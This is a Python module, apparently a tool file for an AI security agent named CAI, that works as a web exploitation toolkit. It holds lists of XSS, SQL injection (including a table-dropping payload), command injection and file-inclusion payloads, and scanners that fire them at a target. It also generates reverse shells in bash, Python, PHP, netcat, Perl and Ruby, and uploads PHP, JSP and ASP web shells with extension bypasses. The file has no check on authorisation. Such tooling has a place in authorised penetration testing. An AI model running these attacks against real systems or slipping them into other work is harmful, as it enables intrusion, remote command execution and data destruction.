"""
Advanced Web Exploitation Toolkit for CAI

This module provides comprehensive web application security testing tools including
automated vulnerability detection, payload generation, and exploit automation.
"""

import requests
import urllib.parse
import base64
import hashlib
import random
import string
import re
import json
import time
from typing import Dict, List, Tuple, Optional, Any
from cai.tools.common import run_command


class WebExploitationFramework:
    """Comprehensive web exploitation framework"""

    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })

        # Common payloads for different vulnerabilities
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'-alert('XSS')-'",
            "\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<body onload=alert('XSS')>"
        ]

        self.sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users;--",
            "' OR SLEEP(5)--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "1' OR '1'='1' /*",
            "admin'--",
            "' OR 1=1 LIMIT 1--",
            "' UNION SELECT user(),version(),database()--"
        ]

        self.rce_payloads = [
            "; id",
            "| id",
            "& id",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "& cat /etc/passwd",
            "; whoami",
            "| whoami",
            "& whoami",
            "; uname -a"
        ]

        self.lfi_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd%00",
            "../../../../../proc/version",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2B"
        ]


def automated_web_scan(target_url: str, **kwargs) -> str:
    """
    Perform comprehensive automated web application security scan
    
    Args:
        target_url: Target web application URL
        
    Returns:
        str: Detailed scan results with vulnerabilities found
    """
    framework = WebExploitationFramework()
    results = []
    results.append(f"=== Automated Web Security Scan ===")
    results.append(f"Target: {target_url}")
    results.append(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    results.append("")

    try:
        # 1. Information Gathering
        results.append("=== Information Gathering ===")
        info_results = gather_web_info(target_url)
        results.append(info_results)
        results.append("")

        # 2. Directory Enumeration
        results.append("=== Directory Enumeration ===")
        dir_results = directory_bruteforce(target_url)
        results.append(dir_results)
        results.append("")

        # 3. Vulnerability Scanning
        results.append("=== Vulnerability Testing ===")

        # XSS Testing
        xss_results = test_xss_vulnerabilities(target_url)
        results.append("XSS Testing:")
        results.append(xss_results)
        results.append("")

        # SQL Injection Testing
        sqli_results = test_sql_injection(target_url)
        results.append("SQL Injection Testing:")
        results.append(sqli_results)
        results.append("")

        # Command Injection Testing
        rce_results = test_command_injection(target_url)
        results.append("Command Injection Testing:")
        results.append(rce_results)
        results.append("")

        # Local File Inclusion Testing
        lfi_results = test_lfi_vulnerabilities(target_url)
        results.append("Local File Inclusion Testing:")
        results.append(lfi_results)
        results.append("")

        # 4. Authentication Testing
        results.append("=== Authentication Testing ===")
        auth_results = test_authentication_bypass(target_url)
        results.append(auth_results)
        results.append("")

        return "\n".join(results)

    except Exception as e:
        return f"Error during automated scan: {str(e)}"


def gather_web_info(target_url: str, **kwargs) -> str:
    """Gather comprehensive information about the target web application"""
    framework = WebExploitationFramework()
    results = []

    try:
        response = framework.session.get(target_url)

        # Server information
        results.append(f"Server: {response.headers.get('Server', 'Unknown')}")
        results.append(f"Status Code: {response.status_code}")
        results.append(f"Content-Type: {response.headers.get('Content-Type', 'Unknown')}")

        # Security headers analysis
        security_headers = {
            'Strict-Transport-Security': 'HSTS',
            'Content-Security-Policy': 'CSP',
            'X-Frame-Options': 'Clickjacking Protection',
            'X-Content-Type-Options': 'MIME Type Sniffing Protection',
            'X-XSS-Protection': 'XSS Filter'
        }

        results.append("\nSecurity Headers Analysis:")
        for header, description in security_headers.items():
            if header in response.headers:
                results.append(f"✓ {description}: {response.headers[header]}")
            else:
                results.append(f"✗ Missing {description}")

        # Technology detection
        results.append("\nTechnology Detection:")
        tech_headers = ['X-Powered-By', 'X-AspNet-Version', 'X-PHP-Version']
        for header in tech_headers:
            if header in response.headers:
                results.append(f"- {header}: {response.headers[header]}")

        # Check for common CMS signatures
        cms_signatures = {
            'wp-content': 'WordPress',
            'joomla': 'Joomla',
            'drupal': 'Drupal',
            'magento': 'Magento'
        }

        for signature, cms in cms_signatures.items():
            if signature in response.text.lower():
                results.append(f"- Possible CMS: {cms}")
                break

        # Check cookies
        if response.cookies:
            results.append("\nCookies:")
            for cookie in response.cookies:
                flags = []
                if cookie.secure:
                    flags.append("Secure")
                if hasattr(cookie, 'httponly') and cookie.httponly:
                    flags.append("HttpOnly")
                results.append(f"- {cookie.name}: {' '.join(flags) if flags else 'No security flags'}")

        return "\n".join(results)

    except Exception as e:
        return f"Error gathering information: {str(e)}"


def directory_bruteforce(target_url: str, wordlist: Optional[List[str]] = None, **kwargs) -> str:
    """Perform directory and file enumeration"""
    framework = WebExploitationFramework()

    if not wordlist:
        # Common directories and files
        wordlist = [
            'admin', 'administrator', 'login', 'wp-admin', 'wp-login.php',
            'phpmyadmin', 'config', 'backup', 'test', 'dev', 'api',
            'robots.txt', 'sitemap.xml', '.htaccess', 'web.config',
            'index.php', 'index.html', 'readme.txt', 'changelog.txt',
            'config.php', 'database.php', 'db.php', 'connect.php',
            'includes', 'uploads', 'images', 'css', 'js', 'assets',
            'tmp', 'temp', 'cache', 'logs', 'log', 'error_log'
        ]

    results = []
    found_paths = []

    base_url = target_url.rstrip('/')

    for path in wordlist:
        try:
            test_url = f"{base_url}/{path}"
            response = framework.session.get(test_url, timeout=5)

            if response.status_code == 200:
                found_paths.append(f"✓ {test_url} (Status: {response.status_code}, Size: {len(response.content)})")
            elif response.status_code in [301, 302]:
                location = response.headers.get('Location', 'Unknown')
                found_paths.append(f"→ {test_url} redirects to {location}")
            elif response.status_code == 403:
                found_paths.append(f"⚠ {test_url} (Forbidden - may exist)")

        except Exception:
            continue

    if found_paths:
        results.append("Found directories/files:")
        results.extend(found_paths)
    else:
        results.append("No interesting directories/files found")

    return "\n".join(results)


def test_xss_vulnerabilities(target_url: str, **kwargs) -> str:
    """Test for Cross-Site Scripting vulnerabilities"""
    framework = WebExploitationFramework()
    results = []
    vulnerabilities = []

    try:
        # Get the target page
        response = framework.session.get(target_url)

        # Find forms
        forms = re.findall(r'<form[^>]*>(.*?)</form>', response.text, re.DOTALL | re.IGNORECASE)
        inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', response.text, re.IGNORECASE)

        # Test URL parameters
        parsed_url = urllib.parse.urlparse(target_url)
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            for param in params:
                for payload in framework.xss_payloads[:3]:  # Test first 3 payloads
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"

                    test_response = framework.session.get(test_url)
                    if payload in test_response.text:
                        vulnerabilities.append(f"Reflected XSS in parameter '{param}' with payload: {payload}")

        # Test form inputs
        for input_name in inputs[:5]:  # Test first 5 inputs
            for payload in framework.xss_payloads[:3]:
                data = {input_name: payload}
                try:
                    test_response = framework.session.post(target_url, data=data)
                    if payload in test_response.text:
                        vulnerabilities.append(f"XSS in form input '{input_name}' with payload: {payload}")
                except Exception:
                    continue

        if vulnerabilities:
            results.append("XSS Vulnerabilities Found:")
            results.extend([f"- {vuln}" for vuln in vulnerabilities])
        else:
            results.append("No XSS vulnerabilities detected")

    except Exception as e:
        results.append(f"Error testing XSS: {str(e)}")

    return "\n".join(results)


def test_sql_injection(target_url: str, **kwargs) -> str:
    """Test for SQL Injection vulnerabilities"""
    framework = WebExploitationFramework()
    results = []
    vulnerabilities = []

    try:
        # Test URL parameters
        parsed_url = urllib.parse.urlparse(target_url)
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            for param in params:
                original_url = target_url
                original_response = framework.session.get(original_url)
                original_length = len(original_response.text)

                for payload in framework.sqli_payloads[:5]:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"

                    test_response = framework.session.get(test_url)

                    # Check for SQL error patterns
                    sql_errors = [
                        'sql syntax', 'mysql_fetch', 'postgresql', 'ora-', 'microsoft ole db',
                        'sqlite_', 'syntax error', 'mysql error', 'warning: mysql'
                    ]

                    for error in sql_errors:
                        if error in test_response.text.lower():
                            vulnerabilities.append(f"SQL Injection in parameter '{param}' - Error: {error}")
                            break

                    # Check for timing-based SQLi (SLEEP payload)
                    if 'sleep' in payload.lower():
                        start_time = time.time()
                        framework.session.get(test_url)
                        elapsed_time = time.time() - start_time
                        if elapsed_time > 4:  # If response took longer than 4 seconds
                            vulnerabilities.append(f"Time-based SQL Injection in parameter '{param}'")

        # Test POST parameters (simplified)
        response = framework.session.get(target_url)
        inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', response.text, re.IGNORECASE)

        for input_name in inputs[:3]:  # Test first 3 inputs
            for payload in framework.sqli_payloads[:3]:
                data = {input_name: payload}
                try:
                    test_response = framework.session.post(target_url, data=data)

                    sql_errors = ['sql syntax', 'mysql_fetch', 'syntax error']
                    for error in sql_errors:
                        if error in test_response.text.lower():
                            vulnerabilities.append(f"SQL Injection in form input '{input_name}'")
                            break
                except Exception:
                    continue

        if vulnerabilities:
            results.append("SQL Injection Vulnerabilities Found:")
            results.extend([f"- {vuln}" for vuln in vulnerabilities])
        else:
            results.append("No SQL Injection vulnerabilities detected")

    except Exception as e:
        results.append(f"Error testing SQL Injection: {str(e)}")

    return "\n".join(results)


def test_command_injection(target_url: str, **kwargs) -> str:
    """Test for Command Injection vulnerabilities"""
    framework = WebExploitationFramework()
    results = []
    vulnerabilities = []

    try:
        parsed_url = urllib.parse.urlparse(target_url)

        # Test URL parameters
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            for param in params:
                for payload in framework.rce_payloads[:5]:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"

                    test_response = framework.session.get(test_url)

                    # Check for command execution indicators
                    cmd_indicators = ['uid=', 'gid=', 'root:', '/bin/', 'linux', 'windows']
                    for indicator in cmd_indicators:
                        if indicator in test_response.text.lower():
                            vulnerabilities.append(f"Command Injection in parameter '{param}' with payload: {payload}")
                            break

        # Test form inputs
        response = framework.session.get(target_url)
        inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', response.text, re.IGNORECASE)

        for input_name in inputs[:3]:
            for payload in framework.rce_payloads[:3]:
                data = {input_name: payload}
                try:
                    test_response = framework.session.post(target_url, data=data)

                    cmd_indicators = ['uid=', 'gid=', 'root:', '/bin/']
                    for indicator in cmd_indicators:
                        if indicator in test_response.text.lower():
                            vulnerabilities.append(f"Command Injection in form input '{input_name}'")
                            break
                except Exception:
                    continue

        if vulnerabilities:
            results.append("Command Injection Vulnerabilities Found:")
            results.extend([f"- {vuln}" for vuln in vulnerabilities])
        else:
            results.append("No Command Injection vulnerabilities detected")

    except Exception as e:
        results.append(f"Error testing Command Injection: {str(e)}")

    return "\n".join(results)


def test_lfi_vulnerabilities(target_url: str, **kwargs) -> str:
    """Test for Local File Inclusion vulnerabilities"""
    framework = WebExploitationFramework()
    results = []
    vulnerabilities = []

    try:
        parsed_url = urllib.parse.urlparse(target_url)

        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            for param in params:
                for payload in framework.lfi_payloads[:5]:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(test_params, doseq=True)}"

                    test_response = framework.session.get(test_url)

                    # Check for file inclusion indicators
                    lfi_indicators = ['root:x:0:0:', '[boot loader]', '<?php', '#!/bin/bash']
                    for indicator in lfi_indicators:
                        if indicator in test_response.text:
                            vulnerabilities.append(
                                f"Local File Inclusion in parameter '{param}' with payload: {payload}")
                            break

        if vulnerabilities:
            results.append("Local File Inclusion Vulnerabilities Found:")
            results.extend([f"- {vuln}" for vuln in vulnerabilities])
        else:
            results.append("No LFI vulnerabilities detected")

    except Exception as e:
        results.append(f"Error testing LFI: {str(e)}")

    return "\n".join(results)


def test_authentication_bypass(target_url: str, **kwargs) -> str:
    """Test for authentication bypass vulnerabilities"""
    framework = WebExploitationFramework()
    results = []
    vulnerabilities = []

    try:
        # Common authentication bypass payloads
        auth_bypasses = [
            ("admin' --", "password"),
            ("admin'/*", "*/password"),
            ("' or 1=1--", "' or 1=1--"),
            ("admin", "' or '1'='1"),
            ("admin", "admin' or '1'='1'--"),
        ]

        # Look for login forms
        response = framework.session.get(target_url)
        login_indicators = ['login', 'signin', 'password', 'username']

        if any(indicator in response.text.lower() for indicator in login_indicators):
            results.append("Login form detected, testing authentication bypass...")

            for username, password in auth_bypasses:
                data = {
                    'username': username,
                    'password': password,
                    'user': username,
                    'pass': password,
                    'email': username,
                    'login': username
                }

                try:
                    auth_response = framework.session.post(target_url, data=data)

                    # Check for successful login indicators
                    success_indicators = ['welcome', 'dashboard', 'logout', 'profile', 'admin panel']
                    if any(indicator in auth_response.text.lower() for indicator in success_indicators):
                        vulnerabilities.append(f"Authentication bypass with credentials: {username}/{password}")
                except Exception:
                    continue

        if vulnerabilities:
            results.append("Authentication Bypass Vulnerabilities:")
            results.extend([f"- {vuln}" for vuln in vulnerabilities])
        else:
            results.append("No authentication bypass vulnerabilities detected")

    except Exception as e:
        results.append(f"Error testing authentication bypass: {str(e)}")

    return "\n".join(results)


def generate_reverse_shell_payload(target_ip: str, target_port: int, shell_type: str = "bash", **kwargs) -> str:
    """Generate reverse shell payloads for different environments"""
    payloads = {}

    # Bash reverse shell
    payloads['bash'] = f"bash -i >& /dev/tcp/{target_ip}/{target_port} 0>&1"

    # Python reverse shell
    payloads[
        'python'] = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{target_ip}",{target_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""

    # PHP reverse shell
    payloads['php'] = f"""php -r '$sock=fsockopen("{target_ip}",{target_port});exec("/bin/sh -i <&3 >&3 2>&3");'"""

    # Netcat reverse shell
    payloads['netcat'] = f"nc -e /bin/sh {target_ip} {target_port}"

    # Perl reverse shell
    payloads[
        'perl'] = f"""perl -e 'use Socket;$i="{target_ip}";$p={target_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"""

    # Ruby reverse shell
    payloads[
        'ruby'] = f"""ruby -rsocket -e'f=TCPSocket.open("{target_ip}",{target_port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""

    if shell_type in payloads:
        return f"Reverse shell payload ({shell_type}):\n{payloads[shell_type]}"
    else:
        result = "Available reverse shell payloads:\n\n"
        for shell, payload in payloads.items():
            result += f"{shell.upper()}:\n{payload}\n\n"
        return result


def exploit_file_upload_vulnerability(target_url: str, shell_type: str = "php", **kwargs) -> str:
    """Attempt to exploit file upload vulnerabilities"""
    framework = WebExploitationFramework()
    results = []

    try:
        # PHP web shell
        php_shell = """<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
<form method="GET">
<input type="text" name="cmd" placeholder="Enter command">
<input type="submit" value="Execute">
</form>
"""

        # JSP web shell
        jsp_shell = """<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    InputStream in = p.getInputStream();
    int a = 0;
    while ((a = in.read()) != -1) {
        out.print((char) a);
    }
}
%>
<form>
<input type="text" name="cmd">
<input type="submit">
</form>
"""

        # ASP web shell
        asp_shell = """<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec(Request.QueryString("cmd"))
o = cmd.StdOut.Readall()
Response.write(o)
%>
<form>
<input name="cmd">
<input type="submit">
</form>
"""

        shells = {
            'php': ('shell.php', php_shell),
            'jsp': ('shell.jsp', jsp_shell),
            'asp': ('shell.asp', asp_shell)
        }

        if shell_type in shells:
            filename, content = shells[shell_type]

            # Try different upload methods
            files = {'file': (filename, content, 'text/plain')}

            # Method 1: Direct file upload
            try:
                response = framework.session.post(target_url, files=files)
                if response.status_code == 200:
                    results.append(f"✓ File upload successful with {filename}")
                    results.append(f"Check: {target_url.rstrip('/')}/{filename}")
            except Exception as e:
                results.append(f"Direct upload failed: {str(e)}")

            # Method 2: Try with different extensions
            for ext in ['.txt', '.jpg', '.png', '.pdf']:
                try:
                    fake_filename = f"shell{ext}"
                    files = {'file': (fake_filename, content, 'text/plain')}
                    response = framework.session.post(target_url, files=files)
                    if response.status_code == 200:
                        results.append(f"✓ File upload with extension bypass: {fake_filename}")
                except Exception:
                    continue

        if not results:
            results.append("File upload exploitation unsuccessful")

    except Exception as e:
        results.append(f"Error exploiting file upload: {str(e)}")

    return "\n".join(results)
